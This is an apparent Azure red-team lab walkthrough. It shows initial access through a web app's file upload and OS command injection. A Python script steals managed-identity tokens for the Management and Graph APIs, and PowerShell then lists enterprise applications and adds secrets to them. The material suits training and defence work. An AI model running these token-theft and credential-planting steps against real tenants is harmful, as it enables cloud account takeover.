# Initial Access - OS Command Injection
## Initial Access via Compromised App Service Abuse with OS Command Injection
***Part of - Kill Chain - 3***

  ![test](/img/os_injection.png "Initial Access via App Service Abuse")

<!---objective 12 -->
1. The vulnerable web app and we know that it's vulnerable to insecure file upload and OS command injection.
2. Upload `studentx.py` file as a zip file and execute it via OS command injection vulnerability.
3. When executed the script's via output we can have `token`, `graphtoken` and `cliend_id` parameters.
4. Connect via `Connect-AzAccount` cmdlet and detect which resources are accessable by managed identity. 
  **This error means that the managed identity has no rights on any of the Azure resources.**
  ![test](/img/os_injection_1.png "Initial Access via App Service Abuse")
5. Use Graph API token with the REST API to list all Enterprise Applications in the `defcorphq` tenant.
    ```powershell
    $URI = 'https://graph.microsoft.com/v1.0/applications'
    $RequestParams = @{
      Method = 'GET'
      Uri = $URI
      Headers = @{
        'Authorization' = 'Bearer $graphtoken'
      }
    }
  

  #After successfully execution please execute the command down below 
  (Invoke-RestMethod @RequestParams).value
  ```
6. Check and add credentials to any enterprise applications via abusing permissions of managed identity.
  ![test](/img/os_injection_2.png "Initial Access via App Service Abuse")

  ```

  ```powershell
  . C:\AzAD\Tools\Add-AzADAppSecret.ps1
  Add-AzADAppSecret -GraphToken $graphtoken -Verbose
  ```




**studenx.py file**
```python
import os
import json

IDENTITY_ENDPOINT = os.environ['IDENTITY_ENDPOINT']
IDENTITY_HEADER = os.environ['IDENTITY_HEADER']

cmd = 'curl "%s?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()

print("[+] Management API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])

cmd = 'curl "%s?resource=https://graph.microsoft.com/&api-version=2017-09-01" -H secret:%s' % (IDENTITY_ENDPOINT, IDENTITY_HEADER)

val = os.popen(cmd).read()
print("\r\n[+] Graph API")
print("Access Token: "+json.loads(val)["access_token"])
print("ClientID: "+json.loads(val)["client_id"])
```